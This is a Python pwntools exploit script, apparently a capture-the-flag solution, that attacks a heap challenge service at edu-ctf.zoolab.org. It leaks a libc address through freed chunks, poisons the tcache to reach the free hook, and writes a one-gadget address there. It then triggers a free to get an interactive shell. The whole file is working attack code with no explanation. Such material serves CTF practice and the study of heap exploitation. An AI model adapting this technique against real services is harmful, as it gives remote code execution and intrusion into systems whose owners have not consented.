import pwn
from pprint import pprint
#proc = pwn.process(["./chal"], aslr=True)
proc = pwn.remote("edu-ctf.zoolab.org", 10007)
def alloc_chunk(num:int):
    proc.sendline(b"1")
    proc.sendline(str(num).encode())
    proc.sendline(b"aaa")
    proc.recvuntil(b"success!\n")

def edit_chunk(num:int, content:bytes):
    proc.sendline(b"2")
    proc.sendline(str(num).encode())
    proc.sendline(str(len(content)).encode())
    proc.send(content)
    proc.recvuntil(b"success!\n")

def del_chunk(num:int):
    proc.sendline(b"3")
    proc.sendline(str(num).encode())
    proc.recvuntil(b"success!\n")

for i in range(2):    
    alloc_chunk(i)
    edit_chunk(i, b"a"*0x410)

del_chunk(0)
del_chunk(1)

proc.sendafter(b"> ", b"4")
from pwn import u64

addr = u64(proc.recvuntil(b"a"*0x410).splitlines()[1][6:] + b"\x00"*2)
print(f"leaked address:{hex(addr)}")
libc_base = addr - 2018272
addr += 8808
print(f"free hook addr:{hex(addr)}")

alloc_chunk(8)
alloc_chunk(8)

alloc_chunk(0)
edit_chunk(0, b"a"*24)

alloc_chunk(1)
edit_chunk(1, b"a"*24)

del_chunk(0)
del_chunk(1)

edit_chunk(0, b"a"*24 + 0x21.to_bytes(8, "little") +
addr.to_bytes(8, "little"))
alloc_chunk(3)

# one gadget
edit_chunk(3, (libc_base + 0xe3b01).to_bytes(8, "little"))
proc.sendline(b"3")
proc.sendline(str(0).encode())
proc.interactive()
